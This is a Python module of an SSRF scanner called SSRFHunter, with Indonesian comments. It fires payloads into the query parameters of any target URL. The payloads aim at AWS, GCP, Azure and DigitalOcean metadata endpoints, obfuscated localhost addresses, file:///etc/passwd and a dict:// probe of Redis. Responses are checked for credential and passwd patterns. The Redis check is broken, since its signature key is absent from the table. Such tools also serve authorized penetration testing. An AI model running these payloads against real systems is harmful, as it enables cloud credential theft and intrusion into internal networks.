import requests
import urllib.parse
import copy
from colorama import Fore, Style

class SSRFHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'ZeroBurst-SSRF-Hunter/19.0 (Cloud-Metadata)',
            'Accept': '*/*'
        }
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # Signature Database (Bukti Sukses)
        self.signatures = {
            'AWS': r"ami-id|instance-id|iam/security-credentials",
            'GCP': r"Metadata-Flavor: Google|computeMetadata",
            'AZURE': r"compute/osProfile|network/interface",
            'DIGITALOCEAN': r"droplet_id|public_keys",
            'ETC_PASSWD': r"root:x:0:0",
            'LOCALHOST_CONNECT': r"Connection refused|Network is unreachable|127.0.0.1"
        }

    def generate_payloads(self):
        """
        Menghasilkan payload SSRF untuk Cloud Metadata & Internal Bypass.
        """
        payloads = []
        
        # 1. CLOUD METADATA (Target Paling Bernilai)
        # AWS / OpenStack
        payloads.append({'name': 'AWS Metadata', 'pay': 'http://169.254.169.254/latest/meta-data/', 'sig': 'AWS'})
        # GCP (Google)
        payloads.append({'name': 'GCP Metadata', 'pay': 'http://metadata.google.internal/computeMetadata/v1/', 'sig': 'GCP'})
        # Azure
        payloads.append({'name': 'Azure Metadata', 'pay': 'http://169.254.169.254/metadata/instance?api-version=2017-08-01', 'sig': 'AZURE'})
        # Digital Ocean
        payloads.append({'name': 'DigitalOcean', 'pay': 'http://169.254.169.254/metadata/v1.json', 'sig': 'DIGITALOCEAN'})
        
        # 2. LOCALHOST BYPASS (Evasion Techniques)
        # Standard
        payloads.append({'name': 'Localhost Standard', 'pay': 'http://127.0.0.1', 'sig': 'LOCALHOST_CONNECT'})
        payloads.append({'name': 'Localhost Name', 'pay': 'http://localhost', 'sig': 'LOCALHOST_CONNECT'})
        # IPv6
        payloads.append({'name': 'IPv6 Loopback', 'pay': 'http://[::1]', 'sig': 'LOCALHOST_CONNECT'})
        # Decimal IP (127.0.0.1 -> 2130706433)
        payloads.append({'name': 'Decimal IP Obfuscation', 'pay': 'http://2130706433', 'sig': 'LOCALHOST_CONNECT'})
        # Octal IP
        payloads.append({'name': 'Octal IP Obfuscation', 'pay': 'http://0177.0.0.1', 'sig': 'LOCALHOST_CONNECT'})
        # DNS Alias (localtest.me points to 127.0.0.1)
        payloads.append({'name': 'DNS Rebinding Alias', 'pay': 'http://localtest.me', 'sig': 'LOCALHOST_CONNECT'})
        
        # 3. PROTOCOL SMUGGLING (Scheme Attack)
        payloads.append({'name': 'File Protocol', 'pay': 'file:///etc/passwd', 'sig': 'ETC_PASSWD'})
        payloads.append({'name': 'Dict Protocol', 'pay': 'dict://127.0.0.1:6379/info', 'sig': 'redis_version'})
        
        return payloads

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: Deep SSRF Hunter (Cloud & Internal){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters found. SSRF needs input (e.g. ?url=...).")
            return

        payload_list = self.generate_payloads()
        print(f"{Fore.YELLOW}[+] Testing {len(payload_list)} Cloud & Bypass vectors...{Style.RESET_ALL}")

        total_vulns = 0

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            param_vuln = False
            
            for p in payload_list:
                if param_vuln: break
                
                # Construct URL
                new_params = copy.deepcopy(self.params)
                new_params[param] = [p['pay']]
                query = urllib.parse.urlencode(new_params, doseq=True)
                attack_url = f"{self.base_url}?{query}"

                try:
                    # Timeout pendek karena request ke internal IP yang salah seringkali hang
                    res = self.session.get(attack_url, timeout=4)
                    content = res.text
                    
                    # Detection Logic
                    import re
                    sig_key = p['sig']
                    
                    # Jika signature ada di list regex kita
                    if sig_key in self.signatures:
                        regex = self.signatures[sig_key]
                        if re.search(regex, content):
                            print(f"   {Fore.RED}[CRITICAL] SSRF VULNERABILITY CONFIRMED!{Style.RESET_ALL}")
                            print(f"   ├── Technique : {p['name']}")
                            print(f"   ├── Payload   : {Fore.YELLOW}{p['pay']}{Style.RESET_ALL}")
                            print(f"   └── Evidence  : Found pattern '{regex}' in response")
                            total_vulns += 1
                            param_vuln = True
                    
                    # Analisis Respon Unik (Heuristic)
                    # Jika payload 'file:///etc/passwd' mengembalikan 'root:', itu pasti vuln.
                    
                except requests.exceptions.ConnectTimeout:
                    # Timeout BISA jadi indikasi port filter firewall internal
                    pass
                except Exception:
                    pass
                    
        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: {total_vulns} SSRF Vulnerabilities Found.{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Impact: Cloud Credential Theft, Internal Network Scanning.")
        else:
            print(f"{Fore.GREEN}[OK] Target appears safe from basic SSRF payloads.{Style.RESET_ALL}")

def run_ssrf_scan(url):
    engine = SSRFHunter(url)
    engine.run_scan()